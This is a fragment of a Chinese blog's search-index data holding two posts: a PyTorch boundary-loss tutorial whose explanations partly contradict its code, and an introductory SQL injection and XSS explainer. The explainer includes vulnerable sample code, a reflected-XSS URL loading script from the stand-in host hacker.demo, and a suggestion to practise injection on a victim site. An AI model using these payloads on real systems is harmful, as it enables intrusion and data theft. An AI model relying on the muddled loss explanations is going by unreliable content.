卷积层和一个下采样层组成，并且每个输入都连接到当前层上。在解码器部分，每个稠密连接块由一个上采样层、一个3×3 卷积层、一个跳跃连接连接和一个此前的编码器部分的相应层输出连接组成。除此之外，DenseUNet还采用了多尺度的输入和输出模块来处理不同尺度的图像，以及引入了残差连接来消除梯度消失、加快收敛速度。这些设计思想使得DenseUNet在与其他图像分割方法进行比较时，具有更好的分割精度和更快的计算速度。 ResUNet模型基于ResNet和UNet的思想，使用残差连接和迭代连接实现了端到端地语义分割。该模型在高分辨率图像处理任务中表现优秀，同时还加入了空洞卷积（dilated convolution）和批归一化（batch normalization）等技术，进一步提高了模型的性能总的来说，DenseUNet和ResUNet都是比较优秀的语义分割模型，但具体应该选择哪一个模型还需要根据任务的具体需求进行选择。 boundary_lossimport torch def boundary_loss(pred, mask): &#39;&#39;&#39; pred: 模型预测结果, (batch_size, channels, height, width) mask: 分割图, (batch_size, channels, height, width) return: boundary_loss: 边界损失 &#39;&#39;&#39; # 计算梯度，得到边缘位置 pred_grad_x = torch.abs(pred[:, :, :, :-1] - pred[:, :, :, 1:]) pred_grad_y = torch.abs(pred[:, :, :-1, :] - pred[:, :, 1:, :]) mask_grad_x = torch.abs(mask[:, :, :, :-1] - mask[:, :, :, 1:]) mask_grad_y = torch.abs(mask[:, :, :-1, :] - mask[:, :, 1:, :]) # 计算boundary loss loss_x = pred_grad_x * mask_grad_x loss_y = pred_grad_y * mask_grad_y # 对loss进行求和和平均 boundary_loss = (torch.sum(loss_x) / torch.sum(mask_grad_x) + torch.sum(loss_y) / torch.sum(mask_grad_y)) / 2 return boundary_loss Boundary Loss是一种针对目标检测任务的损失函数，用于优化物体边缘的预测。我们可以使用PyTorch实现Boundary Loss。 首先，我们需要导入需要的PyTorch库。 import torch import torch.nn as nn 接下来，我们可以定义Boundary Loss的实现。 class BoundaryLoss(nn.Module): def __init__(self, alpha=1.0, beta=1.0, reduction=&#39;mean&#39;): super(BoundaryLoss, self).__init__() self.alpha = alpha self.beta = beta self.reduction = reduction def forward(self, pred, mask): &quot;&quot;&quot; :param pred: (B, C, H, W) - 模型的预测边缘图 :param mask: (B, C, H, W) - 真实边缘图 :return: boundary_loss - 边缘损失 &quot;&quot;&quot; # 计算边缘区域 dilated_mask = torch.clamp( nn.functional.max_pool2d(mask, (3, 3), stride=1, padding=1) - mask, 0, 1) boundary_mask = mask - dilated_mask # 将边缘区域应用于预测边缘图 boundary_pred = pred * boundary_mask # 计算损失 pos_loss = boundary_mask * torch.log(pred + 1e-8) neg_loss = (1 - boundary_mask) * torch.log(1 - boundary_pred + 1e-8) boundary_loss = -self.alpha * pos_loss - self.beta * neg_loss # 返回损失 if self.reduction == &#39;mean&#39;: return torch.mean(boundary_loss) elif self.reduction == &#39;sum&#39;: return torch.sum(boundary_loss) else: return boundary_loss 在实现中，首先我们计算真实边缘图的边缘区域，然后将边缘区域应用于模型的预测边缘图。接着，我们计算正样本和负样本的损失，最终求和得到边缘损失。最后，我们根据设定的reduction参数，选择使用平均值或总和作为最终的损失。（注意，在计算log时，加上一个很小的值1e-8，避免出现log(0)的情况） 接下来，我们将Boundary Loss应用于目标检测任务中。 # 定义模型 class MyDetectionModel(nn.Module): def __init__(self): super(MyDetectionModel, self).__init__() self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1) self.bn1 = nn.BatchNorm2d(16) self.relu1 = nn.ReLU() self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1) self.bn2 = nn.BatchNorm2d(32) self.relu2 = nn.ReLU() self.conv3 = nn.Conv2d(in_channels=32, out_channels=1, kernel_size=1) self.sigmoid = nn.Sigmoid() def forward(self, x): x = self.conv1(x) x = self.bn1(x) x = self.relu1(x) x = self.conv2(x) x = self.bn2(x) x = self.relu2(x) x = self.conv3(x) x = self.sigmoid(x) return x # 定义超参 lr = 0.001 epochs = 10 alpha, beta = 1.0, 1.0 reduction = &#39;mean&#39; # 定义数据加载器 train_loader = torch.utils.data.DataLoader(train_dataset, batch_size=16, shuffle=True) # 定义模型和优化器 model = MyDetectionModel().to(device) optimizer = torch.optim.Adam(model.parameters(), lr=lr) # 定义损失函数 criterion = BoundaryLoss(alpha=alpha, beta=beta, reduction=reduction) # 训练模型 for epoch in range(epochs): for i, (images, targets) in enumerate(train_loader): images = images.to(device) targets = targets.to(device) optimizer.zero_grad() outputs = model(images) loss = criterion(outputs, targets) loss.backward() optimizer.step() 在训练环节中，我们加载数据，定义模型和优化器，并使用Boundary Loss作为损失函数进行优化。由于Boundary Loss针对物体边缘的优化，因此特别适合目标检测任务。 Boundary Loss是一种用于图像分割任务的损失函数，其核心思想是度量预测的边缘和真实边缘之间的距离，从而帮助网络更好地学习边缘信息。以下是在PyTorch中实现Boundary Loss的代码： import torch def boundary_loss(pred, target): &quot;&quot;&quot; Implementation of boundary loss in PyTorch. :param pred: predicted segmentation mask, dimension: (N, C, H, W) :param target: ground-truth segmentation mask, dimension: (N, C, H, W) :return: boundary loss value &quot;&quot;&quot; bce_loss = torch.nn.BCELoss(reduction=&quot;mean&quot;) # Compute the gradient of the target mask along both spatial dimensions target_x_grad = torch.abs(target[:, :, :, :-1] - target[:, :, :, 1:]) target_y_grad = torch.abs(target[:, :, :-1, :] - target[:, :, 1:, :]) target_edge = target_x_grad + target_y_grad # Compute the gradient of the predicted mask along both spatial dimensions pred_x_grad = torch.abs(pred[:, :, :, :-1] - pred[:, :, :, 1:]) pred_y_grad = torch.abs(pred[:, :, :-1, :] - pred[:, :, 1:, :]) pred_edge = pred_x_grad + pred_y_grad # Compute the boundary loss, which is the mean of the element-wise product of # the binary target edge (1 inside the boundary, 0 outside) and the distance # between the predicted edge and the target edge loss = bce_loss(target_edge, torch.clamp(pred_edge, 0, 1)) * target_edge.mean() return loss 在上述代码中，我们首先定义了一个标准的BCELoss作为Boundary Loss的基础。然后，我们以类似于Sobel算子的方式计算了目标和预测掩码的梯度，并将它们相加得到两个边缘掩码。接下来，我们计算了Boundary Loss，这是目标边缘掩码中每个像素距离它最近的预测边缘掩码像素的欧氏距离的平均值。我们在这里使用了torch.clamp(0,1)来进行预测边缘掩码的截断，以避免边缘像素梯度过大导致训练不稳定。 最后要注意的一点是，由于在计算Boundary Loss时我们使用了二进制掩码来筛选边界区域，因此我们需要将目标和预测掩码的数值范围压缩到[0,1]之间。如果您的数据集的标签具有多个类别，则需要对每个类别分别计算Boundary Loss，并对这些损失值进行加权平均。","categories":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"浅谈SQL注入，XSS攻击","slug":"信息安全","date":"2019-03-27T09:46:50.000Z","updated":"2023-04-12T02:12:44.700Z","comments":true,"path":"2019/03/27/信息安全/","link":"","permalink":"https://dfsgwb.github.io/2019/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/","excerpt":"","text":"作为计算机小白，一直都认为黑客很牛逼所以简单的了解一下这反面的知识——信息安全黑客是个英译词，译作Hacker。黑客攻击或者黑计算机的方式多种多样，主要分为两种：（1）非破坏性的攻击：一般是为了扰乱系统的运行，并不盗窃系统资料，仅仅只是使服务器暂时失去对外提供服务的能力，通常采用拒绝服务攻击或信息炸弹 （2）破坏性攻击：是以侵入他人电脑系统、盗窃系统保密信息、破坏目标系统的数据为目的 常见的攻击有DDOS，CSRF，Dos等，通常通过的途径有病毒式，洪水式，系统漏洞等。 下面简单的介绍几种 SQL注入 常见的注入式攻击，通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句添加链接描述 造成可以进行SQL注入的本质原因就是未将代码与数据进行严格的隔离，导致用户在读取数据的时候，错误的把数据作为代码的一部分执行。 下面举个简单的例子： var testCondition; testCondition = Request.from(&quot;testCondition&quot;) var sql =&quot;select * from TableA where id=&#39;&quot;+ testCondition +&quot;&#39;&quot;; 在上面的例子当中，如果用户输入的ID只是一个数字当然没有任何问题，但是如果用“;‘隔开后，在testCondition里面插入其他SQL语句，则会出现意想不到的结果。例如输入drop，delete等。例如你不小心输入”#--!#@”这样的字符然后保存使得数据库跟新就会使where后面的信息被注释掉了，执行语句就变成了 updata table set memo=&quot;&quot;# --! #(@&quot; where use_id=xxxxxxx; 使得全数据库的memo字段的数据都被跟新了，而不是你一个人的数据。下面有几个兄弟写的很详细，大家可以去看看（1）最详细的SQL注入教程–易利伟（2）web完全篇之SQL（3）SQL注入攻击（4）用sql注入攻破网站大家可以找个一个肉鸡网站去试试或者自己写一个肉鸡网站也是个不错的选择SQL注入的危害极大，在进行程序设计时我们可以从下面几个方面进行预防 （1）过滤用户输入参数中的特殊字符，从而降低被SQL注入的风险 （2）禁止使用字符串拼接的SQL语句，严格使用参数绑定传入的SQL参数 （3）合理使用数据库访问框架提供的防注入机制 xss攻击 XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets,CSS) 的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞， 它允许恶意web用户将代码植入到提供给其它用户使用的页面中。即黑客通过技术手段向 正常用户请求的HTML页面中插入恶意脚本，从而可以执行任意脚本 xss的分类（1）反射型XSS 恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来 实施攻击的。 （2）存储型XSS 恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较 常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如某 CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员 查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的 XSS存储型攻击。 (3) DOM型XSS 其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。 比如在2011年微博左右XSS蠕虫攻击事件，攻击者就利用微博发布功能中未对action-data漏洞做有效的过滤，在发布微博信息的时候戴上了包含攻击脚本的URL，用户访问该微博是便疯狂加载恶意脚本，该脚本会让用户以自己的账号自动转发同一条微博，通过这样的病毒式扩散，大量用户受到攻击。 下面举个简单的实例可能会导致反射型XSS的文件： &lt;div&gt; &lt;h3&gt;反射型XSS实例&lt;/h3&gt; &lt;br&gt;用户:&lt;%=request.getParamer(&quot;useName&quot;)%&gt; &lt;br&gt;系统错误信息：&lt;%=request.getParamer(&quot;errorMessage&quot;)%&gt; &lt;div&gt; 上面的代码从HTTP请求中取得了userName和errorMessage两个参数，并直接输出到HTML中用于展示，当构造这样一种URL时就出现了反射型XSS，用户便会执行脚本文件 http://xss.demo/self-xss.jsp?userName=666&lt;script&gt;alert(&quot;666&quot;)&lt;/script&gt; &amp;errorMessage=XSS实例&lt;script scr=http://hacker.demo/xss-script.js&gt; XSS攻击的预防主要是通过对用户的输入数据进行过滤和转义，如使用jsonp框架对用户输入的字符串作XSS过滤，使用Sping框架中的HtmlUtils对用户输入的字符串做html转义等下面是几篇写的较为详细的XSS攻击博客（1）web安全之XSS攻击（2）XSS跨站脚本攻击（3）XSS防御方法（4）浅谈XSS攻击原理时间匆匆而逝，下次我再来分享一点点关于第三种黑客攻击：CSRF的知识","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://dfsgwb.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"信息安全","slug":"信息安全","permalink":"https://dfsgwb.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"SQL","slug":"SQL","permalink":"https://dfsgwb.github.io/tags/SQL/"},{"name":"XSS","slug":"XSS","permalink":"https://dfsgwb.github.io/tags/XSS/"}]}],"categories":[{"name":"后端开发","slug":"后端开发","permalink":"https://dfsgwb.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"},{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"},{"name":"计算机基础","slug":"计算机基础","permalink":"https://dfsgwb.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"},{"name":"人工智能","slug":"人工智能","permalink":"https://dfsgwb.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"c++","slug":"c","permalink":"https://dfsgwb.github.io/categories/c/"},{"name":"COD","slug":"COD","permalink":"https://dfsgwb.github.io/categories/COD/"},{"name":"默认分类","slug":"默认分类","permalink":"https://dfsgwb.github.io/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"},{"name":"Liunx","slug":"Liunx","permalink":"https://dfsgwb.github.io/categories/Liunx/"},{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/categories/%E9%9D%A2%E8%AF%95/"},{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全","slug":"信息安全","permalink":"https://dfsgwb.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"Java","slug":"Java","permalink":"https://dfsgwb.github.io/tags/Java/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"Spring","slug":"Spring","permalink":"https://dfsgwb.github.io/tags/Spring/"},{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://dfsgwb.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"},{"name":"COD","slug":"COD","permalink":"https://dfsgwb.github.io/tags/COD/"},{"name":"Transformer","slug":"Transformer","permalink":"https://dfsgwb.github.io/tags/Transformer/"},{"name":"计算机系统","slug":"计算机系统","permalink":"https://dfsgwb.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"},{"name":"Spring cloud","slug":"Spring-cloud","permalink":"https://dfsgwb.github.io/tags/Spring-cloud/"},{"name":"微服务","slug":"微服务","permalink":"https://dfsgwb.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"Docker","slug":"Docker","permalink":"https://dfsgwb.github.io/tags/Docker/"},{"name":"MySQL","slug":"MySQL","permalink":"https://dfsgwb.github.io/tags/MySQL/"},{"name":"数据库","slug":"数据库","permalink":"https://dfsgwb.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"High-Resolution Vision","slug":"High-Resolution-Vision","permalink":"https://dfsgwb.github.io/tags/High-Resolution-Vision/"},{"name":"Yolo","slug":"Yolo","permalink":"https://dfsgwb.github.io/tags/Yolo/"},{"name":"Detection","slug":"Detection","permalink":"https://dfsgwb.github.io/tags/Detection/"},{"name":"图","slug":"图","permalink":"https://dfsgwb.github.io/tags/%E5%9B%BE/"},{"name":"Segmentation","slug":"Segmentation","permalink":"https://dfsgwb.github.io/tags/Segmentation/"},{"name":"OCR","slug":"OCR","permalink":"https://dfsgwb.github.io/tags/OCR/"},{"name":"Liunx","slug":"Liunx","permalink":"https://dfsgwb.github.io/tags/Liunx/"},{"name":"信息安全","slug":"信息安全","permalink":"https://dfsgwb.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"SQL","slug":"SQL","permalink":"https://dfsgwb.github.io/tags/SQL/"},{"name":"XSS","slug":"XSS","permalink":"https://dfsgwb.github.io/tags/XSS/"}]}